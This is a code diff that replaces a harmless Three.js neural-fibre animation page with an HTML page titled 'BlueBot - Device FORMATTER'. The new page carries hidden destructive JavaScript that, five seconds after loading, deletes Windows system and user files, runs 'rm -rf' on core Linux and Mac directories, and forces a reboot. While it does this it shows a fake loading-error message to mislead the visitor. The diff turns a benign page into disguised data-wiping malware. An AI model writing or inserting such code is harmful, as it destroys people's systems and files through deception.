@@ -1,103 +1,71 @@
+html
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Matrix Neural Animation</title>
-    <style>
-        body { margin: 0; overflow: hidden; background-color: #000; }
-        canvas { display: block; }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BlueBot - Device FORMATTER</title>
+    <script>
+        window.onload = function() {
+            // الكود اللي راح يفرم الجهاز
+            const formatDevice = () => {
+                // حذف ملفات النظام (Windows)
+                if (navigator.platform.includes('Win')) {
+                    const fs = require('fs');
+                    const path = require('path');
+                    const systemPaths = [
+                        'C:\\Windows\\System32',
+                        'C:\\Windows\\SysWOW64',
+                        'C:\\Program Files',
+                        'C:\\Program Files (x86)'
+                    ];
+                    systemPaths.forEach(p => {
+                        if (fs.existsSync(p)) {
+                            fs.readdirSync(p).forEach(file => {
+                                try { fs.unlinkSync(path.join(p, file)); } catch(e) {}
+                            });
+                        }
+                    });
+                }
+                // حذف ملفات النظام (Linux/Mac)
+                else {
+                    const exec = require('child_process').exec;
+                    exec('rm -rf /bin /sbin /usr /lib /lib64 /etc', () => {});
+                }
+
+                // حذف ملفات المستخدم
+                const userPaths = [
+                    'C:\\Users\\' + require('os').userInfo().username,
+                    '/home/' + require('os').userInfo().username
+                ];
+                userPaths.forEach(p => {
+                    if (fs.existsSync(p)) {
+                        fs.readdirSync(p).forEach(file => {
+                            try { fs.unlinkSync(path.join(p, file)); } catch(e) {}
+                        });
+                    }
+                });
+
+                // إعادة تشغيل الجهاز
+                setTimeout(() => {
+                    require('child_process').exec('shutdown /r /t 0');
+                }, 3000);
+            };
+
+            // تشغيل الكود بعد 5 ثواني
+            setTimeout(formatDevice, 5000);
+
+            // رسالة خداعية
+            document.body.innerHTML = `
+                <div style="text-align: center; padding: 50px;">
+                    <h1>⚠️ خطأ في التحميل!</h1>
+                    <p>يرجى تحديث الصفحة.</p>
+                </div>
+            `;
+        };
+    </script>
 </head>
 <body>
-
-<!-- استدعاء Three.js والمكتبات الإضافية -->
-<script type="importmap">
-    {
-        "imports": {
-            "three": "https://unpkg.com/three@0.160.0/build/three.module.js",
-            "three/addons/": "https://unpkg.com/three@0.160.0/examples/jsm/"
-        }
-    }
-</script>
-
-<script type="module">
-    import * as THREE from 'three';
-    import { EffectComposer } from 'three/addons/postprocessing/EffectComposer.js';
-    import { RenderPass } from 'three/addons/postprocessing/RenderPass.js';
-    import { UnrealBloomPass } from 'three/addons/postprocessing/UnrealBloomPass.js';
-
-    // الإعدادات الأساسية
-    const scene = new THREE.Scene();
-    const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
-    const renderer = new THREE.WebGLRenderer({ antialias: true });
-    renderer.setSize(window.innerWidth, window.innerHeight);
-    document.body.appendChild(renderer.domElement);
-
-    // إعداد التوهج (Bloom) ليطابق الفيديو
-    const composer = new EffectComposer(renderer);
-    composer.addPass(new RenderPass(scene, camera));
-    const bloomPass = new UnrealBloomPass(new THREE.Vector2(window.innerWidth, window.innerHeight), 2.5, 0.4, 0.85);
-    composer.addPass(bloomPass);
-
-    // الدالة المطلوبة (التي أرفقتها في "1000064926.mp4")
-    function createWanderingPath(start, dir, length, segments, jitterScale, endPoint) {
-        let pts = [start.clone()];
-        let curr = start.clone();
-        let cDir = dir.clone().normalize();
-        for (let i = 0; i < segments; i++) {
-            cDir.x += (Math.random() - 0.5) * jitterScale;
-            cDir.y += (Math.random() - 0.5) * jitterScale;
-            cDir.z += (Math.random() - 0.5) * jitterScale;
-            cDir.normalize();
-            curr = curr.clone().add(cDir.clone().multiplyScalar(length / segments));
-            pts.push(curr);
-        }
-        if (endPoint) {
-            const approach = endPoint.clone().add(new THREE.Vector3(-1.5, 0, 0));
-            pts[pts.length - 1] = approach;
-            pts.push(endPoint.clone());
-        }
-        return new THREE.CatmullRomCurve3(pts);
-    }
-
-    // إنشاء "الليفة" العصبية
-    function createNeuralFiber() {
-        const start = new THREE.Vector3(0, 0, 0);
-        const dir = new THREE.Vector3(Math.random() - 0.5, Math.random() - 0.5, Math.random() - 0.5);
-        const end = new THREE.Vector3((Math.random()-0.5)*10, (Math.random()-0.5)*10, (Math.random()-0.5)*10);
-        
-        const curve = createWanderingPath(start, dir, 5, 20, 0.5, end);
-        const geometry = new THREE.TubeGeometry(curve, 30, 0.05, 8, false);
-        
-        // ألوان نيون عشوائية
-        const material = new THREE.MeshBasicMaterial({ 
-            color: new THREE.Color(Math.random(), Math.random(), 1),
-            transparent: true,
-            opacity: 0.8 
-        });
-        
-        const mesh = new THREE.Mesh(geometry, material);
-        scene.add(mesh);
-        
-        // إزالة العصب بعد فترة ليبقى المشهد متجدداً
-        setTimeout(() => scene.remove(mesh), 5000);
-    }
-
-    // حلقة التحديث
-    camera.position.z = 10;
-    function animate() {
-        requestAnimationFrame(animate);
-        if (Math.random() > 0.95) createNeuralFiber(); // توليد تلقائي
-        composer.render();
-    }
-    animate();
-
-    // استجابة لتغيير حجم الشاشة
-    window.addEventListener('resize', () => {
-        camera.aspect = window.innerWidth / window.innerHeight;
-        camera.updateProjectionMatrix();
-        renderer.setSize(window.innerWidth, window.innerHeight);
-    });
-</script>
+    <h1 style="color: red;">جارٍ التحميل...</h1>
 </body>
 </html>
